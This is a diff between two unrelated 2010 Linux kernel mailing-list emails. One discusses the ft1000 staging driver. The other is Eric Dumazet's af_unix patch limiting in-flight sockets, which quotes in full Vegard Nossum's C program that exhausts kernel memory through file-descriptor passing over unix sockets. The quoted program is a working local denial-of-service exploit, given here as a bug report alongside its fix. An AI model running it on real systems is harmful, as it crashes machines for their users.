@@ -1,115 +1,198 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752407Ab0KXJQm (ORCPT <rfc822;w@1wt.eu>);
-	Wed, 24 Nov 2010 04:16:42 -0500
-Received: from mail-qy0-f174.google.com ([209.85.216.174]:44573 "EHLO
-	mail-qy0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1750969Ab0KXJQk convert rfc822-to-8bit (ORCPT
+	id S1752624Ab0KXJTE (ORCPT <rfc822;w@1wt.eu>);
+	Wed, 24 Nov 2010 04:19:04 -0500
+Received: from mail-fx0-f46.google.com ([209.85.161.46]:55941 "EHLO
+	mail-fx0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751544Ab0KXJTA (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Wed, 24 Nov 2010 04:16:40 -0500
+	Wed, 24 Nov 2010 04:19:00 -0500
 DomainKey-Signature: a=rsa-sha1; c=nofws;
         d=gmail.com; s=gamma;
-        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
-         :cc:content-type:content-transfer-encoding;
-        b=qiA3dwhzGzKPmZRGWaqpW3yc4ck0RL3ZofX+dRcdy3aX8SBqQcSslmAmZ3HJ8U6J5a
-         7KOqLQ2rcIYhZocCMMcM62N+TnvYo5lvqWNL2RpD2CM8P0rtFZ5wIm3xwVcQt6t7XbvU
-         Xhz1yrsNaBSimTwY4hB/mDkOOwLXB0eclXeA8=
-MIME-Version: 1.0
-In-Reply-To: <4CEC3211.7050503@gmail.com>
-References: <1290515373-16145-1-git-send-email-marek.belisko@open-nandra.com>
-	<1290515373-16145-3-git-send-email-marek.belisko@open-nandra.com>
-	<4CEBC751.6090906@gmail.com>
-	<AANLkTimWb1KxhUph+bCELJ1nshnTScB1sU+hb=9CTceb@mail.gmail.com>
-	<4CEC3211.7050503@gmail.com>
-Date: Wed, 24 Nov 2010 10:16:36 +0100
-Message-ID: <AANLkTin6Am=17wyMZJRu9bYk5-QTYqZhGtZqV_sDwJW4@mail.gmail.com>
-Subject: Re: [PATCH 2/6] staging: ft1000: Use misc device instead self created device.
-From: Belisko Marek <marek.belisko@gmail.com>
-To: Jiri Slaby <jirislaby@gmail.com>
-Cc: Greg Kroah-Hartman <gregkh@suse.de>, devel@driverdev.osuosl.org,
-        linux-kernel@vger.kernel.org
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8BIT
+        h=subject:from:to:cc:in-reply-to:references:content-type:date
+         :message-id:mime-version:x-mailer:content-transfer-encoding;
+        b=iVQSbWKE49jODomPDkm4pMvN0cTfr4ioK6Xr3OBdcSNX16d2aupWKBDR1mfb4nmX0A
+         iz+2+/qJXia+dEHj1skpPTEYg4jvizcCBybz7ffPH94Fku92XHEYjm+kRVKF1U9cxajR
+         qlVU5hBFUhJymB2k0QA5+S8tWJ8EtPfm1m0h8=
+Subject: [PATCH] af_unix: limit unix_tot_inflight
+From: Eric Dumazet <eric.dumazet@gmail.com>
+To: Vegard Nossum <vegard.nossum@gmail.com>,
+        David Miller <davem@davemloft.net>
+Cc: LKML <linux-kernel@vger.kernel.org>,
+        Andrew Morton <akpm@linux-foundation.org>,
+        Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
+In-Reply-To: <1290553918.2866.80.camel@edumazet-laptop>
+References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
+	 <1290553918.2866.80.camel@edumazet-laptop>
+Content-Type: text/plain; charset="UTF-8"
+Date: Wed, 24 Nov 2010 10:18:55 +0100
+Message-ID: <1290590335.3464.24.camel@edumazet-laptop>
+Mime-Version: 1.0
+X-Mailer: Evolution 2.30.3 
+Content-Transfer-Encoding: 8bit
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Tue, Nov 23, 2010 at 10:28 PM, Jiri Slaby <jirislaby@gmail.com> wrote:
-> On 11/23/2010 03:00 PM, Belisko Marek wrote:
->> On Tue, Nov 23, 2010 at 2:53 PM, Jiri Slaby <jirislaby@gmail.com> wrote:
->>> On 11/23/2010 01:29 PM, Marek Belisko wrote:
->>>> Use simple misc device for ioctl driver funtionality testing.
->>>>
->>>> Signed-off-by: Marek Belisko <marek.belisko@open-nandra.com>
->>>> ---
->>>>  drivers/staging/ft1000/ft1000-usb/ft1000_chdev.c |   90 ++++++++++++++++++---
->>>>  1 files changed, 77 insertions(+), 13 deletions(-)
->>>>
->>>> diff --git a/drivers/staging/ft1000/ft1000-usb/ft1000_chdev.c b/drivers/staging/ft1000/ft1000-usb/ft1000_chdev.c
->>>> index 1aec926..d1784a3 100644
->>>> --- a/drivers/staging/ft1000/ft1000-usb/ft1000_chdev.c
->>>> +++ b/drivers/staging/ft1000/ft1000-usb/ft1000_chdev.c
->>>> @@ -32,6 +32,7 @@
->>>>  #include <linux/poll.h>
->>>>  #include <linux/netdevice.h>
->>>>  #include <linux/delay.h>
->>>> +#include <linux/miscdevice.h>
->>>>
->>>>  #include <linux/fs.h>
->>>>  #include <linux/kmod.h>
->>>> @@ -78,6 +79,47 @@ static struct file_operations ft1000fops =
->>>>       .llseek         = no_llseek,
->>>>  };
->>>>
->>>> +struct ft1000_misc_device {
->>>> +     struct miscdevice dev;
->>>> +     int inf_id;
->>>> +};
->>>> +
->>>> +#define FREE_ID (0xFF)
->>>> +
->>>> +/* we support just 3 devices */
->>>> +#define MAX_DEVICE 3
->>>
->>> No, why this should be converted to miscdevice? Leave it as chrdev.
->> Is there any problem with using miscdev?
->
-> Yes, if you want more than a single device per system.
->
->> Old interface create /dev nodes with
->> calling kernel thread and some usermode_helper or whatever.
->
-> Yes, that's crap indeed. But doesn't judge for miscdevice.
->
->> Just convert to misc dev
->> where this is done automatically.
->
-> So the only thing you need to do is to send a uevent to udev appropriately.
-Could be used something like:
-register_chrdev(0,"ft1000", &fops)
-class = class_create(THIS_MODULE, "ft1000");
-device_create(class, NULL, MKDEV(major, i), NULL, "ft1000%d", i);
-Then will be created different devices for every plugged device.
-This should have effect of automatic device node creation also suppose.
+Le mercredi 24 novembre 2010 à 00:11 +0100, Eric Dumazet a écrit :
+> Le mardi 23 novembre 2010 à 23:21 +0100, Vegard Nossum a écrit :
+> > Hi,
+> > 
+> > I found this program lying around on my laptop. It kills my box
+> > (2.6.35) instantly by consuming a lot of memory (allocated by the
+> > kernel, so the process doesn't get killed by the OOM killer). As far
+> > as I can tell, the memory isn't being freed when the program exits
+> > either. Maybe it will eventually get cleaned up the UNIX socket
+> > garbage collector thing, but in that case it doesn't get called
+> > quickly enough to save my machine at least.
+> > 
+> > #include <sys/mount.h>
+> > #include <sys/socket.h>
+> > #include <sys/un.h>
+> > #include <sys/wait.h>
+> > 
+> > #include <errno.h>
+> > #include <fcntl.h>
+> > #include <stdio.h>
+> > #include <stdlib.h>
+> > #include <string.h>
+> > #include <unistd.h>
+> > 
+> > static int send_fd(int unix_fd, int fd)
+> > {
+> >         struct msghdr msgh;
+> >         struct cmsghdr *cmsg;
+> >         char buf[CMSG_SPACE(sizeof(fd))];
+> > 
+> >         memset(&msgh, 0, sizeof(msgh));
+> > 
+> >         memset(buf, 0, sizeof(buf));
+> >         msgh.msg_control = buf;
+> >         msgh.msg_controllen = sizeof(buf);
+> > 
+> >         cmsg = CMSG_FIRSTHDR(&msgh);
+> >         cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
+> >         cmsg->cmsg_level = SOL_SOCKET;
+> >         cmsg->cmsg_type = SCM_RIGHTS;
+> > 
+> >         msgh.msg_controllen = cmsg->cmsg_len;
+> > 
+> >         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+> >         return sendmsg(unix_fd, &msgh, 0);
+> > }
+> > 
+> > int main(int argc, char *argv[])
+> > {
+> >         while (1) {
+> >                 pid_t child;
+> > 
+> >                 child = fork();
+> >                 if (child == -1)
+> >                         exit(EXIT_FAILURE);
+> > 
+> >                 if (child == 0) {
+> >                         int fd[2];
+> >                         int i;
+> > 
+> >                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
+> >                                 goto out_error;
+> > 
+> >                         for (i = 0; i < 100; ++i) {
+> >                                 if (send_fd(fd[0], fd[0]) == -1)
+> >                                         goto out_error;
+> > 
+> >                                 if (send_fd(fd[1], fd[1]) == -1)
+> >                                         goto out_error;
+> >                         }
+> > 
+> >                         close(fd[0]);
+> >                         close(fd[1]);
+> >                         goto out;
+> > 
+> >                 out_error:
+> >                         fprintf(stderr, "error: %s\n", strerror(errno));
+> >                 out:
+> >                         exit(EXIT_SUCCESS);
+> >                 }
+> > 
+> >                 while (1) {
+> >                         pid_t kid;
+> >                         int status;
+> > 
+> >                         kid = wait(&status);
+> >                         if (kid == -1) {
+> >                                 if (errno == ECHILD)
+> >                                         break;
+> >                                 if (errno == EINTR)
+> >                                         continue;
+> > 
+> >                                 exit(EXIT_FAILURE);
+> >                         }
+> > 
+> >                         if (WIFEXITED(status)) {
+> >                                 if (WEXITSTATUS(status))
+> >                                         exit(WEXITSTATUS(status));
+> >                                 break;
+> >                         }
+> >                 }
+> >         }
+> > 
+> >         return EXIT_SUCCESS;
+> > }
+> > 
+> > 
+> > Vegard
+> > --
 
->
-> regards,
-> --
-> js
->
+Here is a patch to address this problem.
 
-thanks,
+Thanks
 
-marek
-,
--- 
-as simple and primitive as possible
--------------------------------------------------
-Marek Belisko - OPEN-NANDRA
-Freelance Developer
+[PATCH] af_unix: limit unix_tot_inflight
 
-Ruska Nova Ves 219 | Presov, 08005 Slovak Republic
-Tel: +421 915 052 184
-skype: marekwhite
-icq: 290551086
-web: http://open-nandra.com
+Vegard Nossum found a unix socket OOM was possible, posting an exploit
+program.
+
+My analysis is we can eat all LOWMEM memory before unix_gc() being
+called from unix_release_sock(). Moreover, the thread blocked in
+unix_gc() can consume huge amount of time to perform cleanup because of
+huge working set.
+
+One way to handle this is to have a sensible limit on unix_tot_inflight,
+tested from wait_for_unix_gc() and to force a call to unix_gc() if this
+limit is hit.
+
+This solves the OOM and also reduce overall latencies, and should not
+slowdown normal workloads.
+
+Reported-by: Vegard Nossum <vegard.nossum@gmail.com>
+Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>
+Cc: Andrew Morton <akpm@linux-foundation.org>
+Cc: Eugene Teo <eugene@redhat.com>
+---
+ net/unix/garbage.c |    7 +++++++
+ 1 files changed, 7 insertions(+)
+
+diff --git a/net/unix/garbage.c b/net/unix/garbage.c
+index c8df6fd..40df93d 100644
+--- a/net/unix/garbage.c
++++ b/net/unix/garbage.c
+@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_sock *u)
+ }
+ 
+ static bool gc_in_progress = false;
++#define UNIX_INFLIGHT_TRIGGER_GC 16000
+ 
+ void wait_for_unix_gc(void)
+ {
++	/*
++	 * If number of inflight sockets is insane,
++	 * force a garbage collect right now.
++	 */
++	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
++		unix_gc();
+ 	wait_event(unix_gc_wait, gc_in_progress == false);
+ }
+ 
+
+
